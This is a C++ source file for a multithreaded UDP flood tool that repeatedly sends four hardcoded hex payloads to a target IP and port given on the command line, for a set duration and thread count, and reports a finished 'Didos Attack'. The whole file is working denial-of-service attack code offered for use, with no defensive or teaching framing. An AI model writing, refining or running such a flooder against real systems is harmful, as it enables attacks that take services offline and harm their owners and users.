#include <iostream>
#include <thread>
#include <vector>
#include <cstring>
#include <arpa/inet.h>  // For socket-related functions on Linux
#include <sys/socket.h>
#include <unistd.h>
#include <cstdlib>
#include <ctime>
#include <chrono>

// Hex payload 1 
unsigned char hex_payload_1[] = {
    0xca, 0x75, 0xc9, 0x94, 0x3c, 0x26, 0xfc, 0x04,
    0x5e, 0xf7, 0x4f, 0xba, 0xf4, 0x5e, 0x5b, 0x57,
    0x22, 0xd4, 0x69, 0x80, 0xb3, 0xaa, 0x21, 0xad,
    0x9e, 0x72, 0x14, 0xf7, 0xd2, 0xdd, 0xe6, 0xe8,
    0x10, 0xc6, 0x93, 0x51
};

                

// playload 2
unsigned char hex_payload_2[] = {
    0x10, 0x71, 0x08, 0x0e, 0x77, 0x3a, 0xa6, 0xac,
    0x0c, 0x77, 0x1d, 0x54, 0xaa, 0x3a, 0xee, 0xec,
    0x54, 0x70, 0x1e, 0xe5, 0xf3, 0x0b, 0x61, 0xbf,
    0xd2, 0x5c, 0x4f, 0xe8
};

// Hex payload 3 
unsigned char hex_payload_3[] = {
    0x7c, 0x35, 0xd2, 0xb9, 0x81, 0x25, 0xe8, 0x06,
    0x26, 0x7f, 0x1c, 0xd0, 0xc6, 0x12, 0x99, 0x4a,
    0xe7, 0xb9, 0x3d, 0x66, 0xb5, 0xae, 0xee, 0xdd,
    0xd9, 0x01, 0x9d, 0x75, 0x74, 0xef, 0x64, 0x1f,
    0x23, 0x7b, 0x4e, 0xc7, 0x9a, 0x27, 0x38
};
// Hex payload 4
unsigned char hex_payload_4[] = {
    0xba, 0x12, 0x01, 0xa5, 0xb0, 0x34, 0xa6, 0xc7,
    0xfc, 0x2d, 0xc1, 0x01, 0xcc, 0x23, 0xe6, 0x21,
    0xb5, 0x98, 0x6b, 0xf4, 0xf5, 0xf2, 0x9f, 0xef,
    0xde, 0xed, 0x7b, 0xcf, 0xd6, 0x33, 0xbb, 0x98,
    0x8d, 0x60, 0x80, 0x5f, 0x9e, 0xf4, 0x68, 0x72,
    0x45, 0x92, 0xf5, 0xaf, 0x54, 0xfc, 0xe6, 0x30,
    0xc3, 0x0c, 0x83, 0xac, 0xb5, 0x4c, 0x69, 0x5a,
    0xa2, 0x6f, 0xb5, 0x7a, 0x96, 0xb9, 0x67, 0xcb,
    0xb6, 0xe7, 0x68, 0x59, 0x9d, 0x76, 0x3d, 0x56,
    0xbb, 0x55, 0x48, 0x6d, 0x92, 0x6d, 0x3d, 0x06,
    0xb6, 0x4a, 0x31, 0x55, 0x97, 0xe9, 0xfb, 0x4f,
    0x3c, 0xbd, 0xcf, 0xa1, 0x4c, 0x33, 0x53, 0x5e,
    0x3d, 0xc6, 0x91, 0xee, 0xf3, 0xac, 0xa7, 0x99,
    0x41, 0xd9, 0xa7, 0x76, 0x11, 0x6a, 0x32, 0x62,
    0xa7, 0x00, 0x22, 0xf6, 0xa1, 0x88, 0x30, 0x07,
    0xbe, 0x68, 0x91, 0x31, 0x3d, 0x11, 0x58, 0xb9,
    0x63, 0xd9, 0x31, 0xd7, 0x40, 0xc4, 0x5b, 0x8c,
    0xf2, 0x40, 0x13, 0x45, 0xd6, 0x9d, 0x85, 0xf5,
    0x5d, 0x3c, 0xe6, 0xb3, 0x81, 0x6b, 0x97, 0xf0,
    0x60, 0xcb, 0xee, 0x2b, 0x67, 0xd8, 0xd3, 0x38,
    0xd0, 0x9e, 0x57, 0xd2, 0xfc, 0xdf, 0x3a, 0xed,
    0x51, 0x0f, 0xd9, 0x71, 0x6d, 0x3e, 0xfd, 0xf4,
    0x5e, 0x3f, 0x8c
};


// Function to send all UDP payloads at the same time
void send_udp_message(const std::string& ip, int port, bool& stop_flag) {
    int sockfd;
    struct sockaddr_in server_addr;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        std::cerr << "Socket creation failed\n";
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

    while (!stop_flag) {
        sendto(sockfd, hex_payload_1, sizeof(hex_payload_1), 0, (const struct sockaddr*)&server_addr, sizeof(server_addr));
        sendto(sockfd, hex_payload_2, sizeof(hex_payload_2), 0, (const struct sockaddr*)&server_addr, sizeof(server_addr));
        sendto(sockfd, hex_payload_3, sizeof(hex_payload_3), 0, (const struct sockaddr*)&server_addr, sizeof(server_addr));
        sendto(sockfd, hex_payload_4, sizeof(hex_payload_4), 0, (const struct sockaddr*)&server_addr, sizeof(server_addr));
    }
    close(sockfd);
}

// Function to be executed by each thread
void udp_flood_thread(const std::string& ip, int port, bool& stop_flag) {
    send_udp_message(ip, port, stop_flag);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Duration (seconds)> <Number of Threads>\n";
        return 1;
    }

    const std::string ip = argv[1];
    const int port = std::stoi(argv[2]);
    const int duration = std::stoi(argv[3]); 
    const int thread_count = std::stoi(argv[4]); 

    srand(time(0));  // Seed for random number generation (not needed for hex payloads but kept for consistency)

    std::vector<std::thread> threads;
    bool stop_flag = false;


    for (int i = 0; i < thread_count; ++i) {
        threads.emplace_back(udp_flood_thread, ip, port, std::ref(stop_flag));
    }

    std::this_thread::sleep_for(std::chrono::seconds(duration));

    stop_flag = true;

    for (auto& th : threads) {
        th.join();
    }

    std::cout << "Didos Attack finished after " << duration << " seconds.\n";

    return 0;
}
